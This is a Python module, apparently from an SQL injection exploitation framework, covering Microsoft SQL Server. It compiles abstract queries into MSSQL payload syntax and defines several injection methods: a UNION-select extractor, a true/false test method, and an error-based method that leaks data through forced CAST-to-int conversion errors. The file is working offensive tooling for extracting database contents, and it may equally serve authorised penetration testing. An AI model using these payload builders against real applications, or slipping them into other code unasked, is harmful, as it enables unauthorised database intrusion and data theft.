from __future__ import annotations

import asyncio
from typing import Callable

from ending import configuration
from ending.ast import *
from ending.ast import Limit, Node
from ending.db import generic
from ending.db.generic import InjectForBytes
from ending.db.generic.map import MetadataMapper
from ending.exception import CompilationError, ConversionError
from ending.util import quoting, randomized
from ending.util.logging import logger

__all__ = [
    "Compiler",
    "SelectMethod",
    "CastAsIntMethod",
    "TestMethod",
    "Mapper",
    "Features",
]


class Features(generic.Features):
    name = "Microsoft SQL Server"
    tautology = "DB_NAME()=DB_NAME()"
    quoters = [
        quoting.singlequote,
        quoting.sum_char,
        quoting.concat_char,
    ]
    error_condition: str = "(SELECT 1 UNION SELECT 2 WHERE {condition})={result}"


class Mapper(MetadataMapper):
    """MsSQL mapper."""


class Compiler(generic.HasConcatWSMixin, generic.Compiler):
    def __init__(self, quote: Callable[[str], str], charset: str = "iso-8859-1"):
        super().__init__(quote, charset)

    def serialize(self, node: Node) -> Node:
        match node.metadata.type:
            case IntType() as tpe:
                # Cast(<int> as VARCHAR)
                return Cast(node, "VARCHAR", type=tpe.to_texttype())
            case BoolType() as tpe:
                # IIF(<bool>, '1', '0')
                return Function["IIF"](node, "1", "0", type=tpe.to_texttype())
            case TextType():
                return node
            case BlobType():
                return Hex(node)
            case tpe:
                raise ConversionError(f"Cannot serialize type: {type(tpe).__name__}")

    def _adjust_column(self, column: Node) -> Node:
        match column.metadata.type:
            case UnknownType():
                column = Cast(column, "VARCHAR(max)")
                column = Function["convert"](
                    Expr("VARBINARY(max)"), column, type=BlobType()
                )
                return column
            case BoolType() if isinstance(column, Identifier):
                # BoolType does not exist on MsSQL, so we convert to the standard BIT
                # column type.
                # We can't assume the type of anything else than an identifier: we might
                # be trying to retrieve the result of a comparison, for example.
                # TODO Raise exception instead ?
                log = logger(self.__module__)
                log.warning(f"Converting bool column {column!r} to bit")
                return column.with_type(IntType(min=0, max=1))
            case _:
                return column

    def compile_Length(self, length: Length, s):
        return Function["LEN"](length.node)

    def compile_Query(self, query: Query, s):
        """Converts an SQL query (SELECT statement) into valid SQL syntax."""
        b = []
        q = query.q

        # If the query only consists of one column and nothing else, the SELECT
        # keyword is inessential and can be removed if it is a subquery
        if (
            "p" in s
            and len(q.columns) == 1
            and not (q.distinct or q.table or q.where or q.order or q.limit)
        ):
            return f"{q.columns[0]:p}"

        b.append("SELECT")

        if q.distinct:
            b.append("DISTINCT")

        b.append(self.compile(List[Identifier](q.columns)))

        if q.table:
            b.append(f"FROM {q.table}")

        if q.where:
            b.append(f"WHERE {q.where}")

        # Limit NEEDS an ORDER statement to work, but we need a column that
        # is not constant
        if q.limit and not q.order:
            # Try and take the first "not constant" value, so that the
            # ordering is useful. Otherwise, just default to 1 and hope for
            # the best.
            # TODO: Raising an exception makes more sense, probably
            try:
                order = next(
                    i + 1 for i, c in enumerate(q.columns) if not c.metadata.single
                )
            except StopIteration:
                order = self.compile(Value(1))
        else:
            order = q.order

        if order:
            b.append(f"ORDER BY {order}")

        # SQL SERVER 2012+
        if q.limit:
            b.append(f"{q.limit}")

        query = " ".join(b)

        if "p" in s:
            return f"({query})"

        return query

    def compile_Limit(self, limit: Limit, s: str) -> str:
        return f"OFFSET {limit.start} ROWS FETCH NEXT {limit.count} ROWS ONLY"

    def compile_Concatenation(self, concatenation: Concatenation, s: str):
        if not concatenation.nodes:
            return Value("")
        return "+".join(f"{node:p}" for node in concatenation.nodes)

    def compile_Ord(self, ord: Ord, s: str):
        match ord.node.metadata.type:
            case BlobType():
                return Function["ASCII"](ord.node)
            case _:
                return Function["UNICODE"](ord.node)

    def compile_Hex(self, hex: Hex, s: str) -> str:
        if isinstance(hex.node.metadata.type, TextType):
            node = Function["convert"](Expr("VARBINARY(max)"), hex.node)
        else:
            node = hex.node
        # VARCHAR(max) allows for 2 GB of storage
        return Function["CONVERT"](Expr("VARCHAR(max)"), node, 2)

    def compile_Value(self, value: Value, s: str) -> str:
        if isinstance(value.value, bool):
            raise CompilationError("Boolean values are not supported in MsSQL")
        return super().compile_Value(value, s)


class SelectMethod(generic.SelectMethod):
    def __init__(
        self,
        compiler: Compiler,
        inject: InjectForBytes,
        *,
        nb_rows: int,
        columns: int | list[Node],
        column: int,
        # Modified to None from 1
        # TODO Make this the default for the generic method ?
        dummy_column: Node = Value(None),
        hex: bool = False,
    ):
        super().__init__(
            compiler,
            inject,
            nb_rows=nb_rows,
            columns=columns,
            column=column,
            dummy_column=dummy_column,
            hex=hex,
        )


class TestMethodConfigurator(configuration.TestMethodConfigurator):
    async def _verify(self) -> None:
        # We use a tautology and a contradiction to verify that the method works as
        # intended, because MsSQL does not support boolean values directly.
        number = randomized.digits()
        queries = [
            Query().columns(Value(number) == Value(number)),
            Query().columns(Value(number) != Value(number)),
        ]
        results = await asyncio.gather(*map(self._fetch_value, queries))

        if results == [True, False]:
            return

        self.logger.debug(
            "Verification of test method returned {results!r} instead of [True, False]"
        )

        raise configuration.ConfigurationException(
            f"Unable to configure **{self.Method.__name__}**"
        )


class TestMethod(generic.TestMethod):
    @staticmethod
    def get_configurator() -> type[TestMethodConfigurator]:
        return TestMethodConfigurator


class CastAsIntMethod(generic.ErrorBasedMethod):
    """`CAST(<value> AS int)` error-based SQL injection method.

    Args:
        compiler (Compiler): A DBMS compiler to compile payloads with
        inject (InjectForBytes): An coroutine that sends an SQL payload and
            returns bytes
    """

    def __init__(self, compiler: Compiler, inject: InjectForBytes):
        super().__init__(
            compiler,
            inject,
            pattern=r"""Conversion failed when converting the varchar value ':(.*)""",
        )

    def build_payload(self, query: Query, position: int) -> Node:
        payload = super().build_payload(query, position)
        return Cast(Concatenation((":", payload)), "int") == 1
